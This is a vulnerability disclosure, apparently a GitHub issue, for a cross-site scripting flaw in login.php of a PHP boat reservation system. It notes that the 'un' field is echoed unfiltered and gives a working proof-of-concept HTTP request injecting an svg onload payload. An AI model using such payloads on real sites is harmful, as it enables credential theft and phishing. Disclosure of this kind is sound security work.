# online-boat-reservation-system-in-php has Cross Site Scripting vulnerability in login.php

## supplier 
https://code-projects.org/online-boat-reservation-system-in-php-with-source-code/
## Vulnerability file
login.php
## describe
There is an  Cross Site Scripting vulnerability in online-boat-reservation-system-in-php  in login.php. Control parameter: $UN

A malicious attacker can use this vulnerability to obtain administrator login credentials or phishing websites

## code analysis

In login.php，get $_POST['un'], and echo it in no filter.

![Image](https://github.com/user-attachments/assets/f2b1d731-7390-41c3-b644-f2de252767ee)

## POC

```
POST /login.php HTTP/1.1
Host: boat
Content-Length: 58
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://boat
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://boat/login.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=04c7c317dd8370a98faa8eb6502383e1
Connection: close

un=1%22%3E%3Csvg%2Fonload%3Dalert%281%29%3B%3E&up=1&login=
```

![Image](https://github.com/user-attachments/assets/64eec2fa-3002-448b-b498-7001c476a79a)

**Result**

![Image](https://github.com/user-attachments/assets/9109b577-f611-47f2-88af-60b10d50a74c)
